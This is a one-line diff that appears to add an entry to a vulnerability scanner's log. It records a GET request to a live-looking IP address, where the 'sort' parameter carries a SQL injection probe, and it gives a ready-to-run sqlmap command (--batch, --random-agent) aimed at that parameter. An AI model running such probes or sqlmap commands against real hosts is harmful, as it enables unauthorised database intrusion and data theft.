@@ -1,0 +1,1 @@
+http://82.156.149.52:80/api/goods/find?limit=20&page=1&sort=2/((6-4)*(2-1)-1)&total=20&word=1 (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\001_SQL_Injection_sort_3883645565363291921.txt --batch --smart --random-agent --output-dir sqlmap_output\001_3883645565363291921 -p sort
